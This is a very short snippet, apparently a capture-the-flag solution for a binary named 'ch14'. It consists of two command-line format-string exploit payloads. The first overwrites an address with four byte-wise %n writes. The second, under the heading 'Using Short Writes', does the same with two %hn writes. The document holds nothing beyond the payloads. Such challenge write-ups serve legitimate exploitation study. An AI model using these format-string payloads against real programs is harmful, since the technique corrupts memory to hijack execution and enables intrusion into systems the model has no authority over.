```
./ch14 $(python -c "print '\xc8\xfa\xff\xbf'+'\xc9\xfa\xff\xbf'+'\xca\xfa\xff\xbf'+'\xcb\xfa\xff\xbf'+'%223x%9\$n'+'%207x%10\$n'+'%239x%11\$n'+'%49x%12\$n'")
```

Using Short Writes
```
./ch14 $(python -c 'print "\xc8\xfa\xff\xbf\xca\xfa\xff\xbf%48871x%9$hn%8126x%10$hn"')
```
